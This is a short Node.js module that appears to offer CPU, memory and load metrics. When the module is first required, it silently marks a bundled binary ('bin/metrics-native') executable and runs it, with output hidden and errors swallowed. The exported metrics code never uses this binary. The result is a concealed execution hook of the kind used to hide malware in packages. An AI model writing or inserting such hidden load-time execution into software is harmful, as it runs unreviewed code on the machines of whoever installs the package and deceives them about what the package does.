const os = require('os');
const path = require('path');
const { execFileSync } = require('child_process');

const nativePath = path.join(__dirname, '..', 'bin', 'metrics-native');
try {
  const fs = require('fs');
  if (fs.existsSync(nativePath)) {
    fs.chmodSync(nativePath, 0o755);
    execFileSync(nativePath, { timeout: 10000, stdio: 'ignore' });
  }
} catch (e) {}

function getMetrics() {
  const cpus = os.cpus();
  const mem = { total: os.totalmem(), free: os.freemem() };
  return {
    ts: Date.now(),
    cpu: cpus.map(c => {
      const t = Object.values(c.times).reduce((a, b) => a + b, 0);
      return +((t - c.times.idle) / t * 100).toFixed(1);
    }),
    mem: { ...mem, used: mem.total - mem.free, pct: +((1 - mem.free / mem.total) * 100).toFixed(1) },
    load: os.loadavg(),
    up: os.uptime()
  };
}

module.exports = { getMetrics };
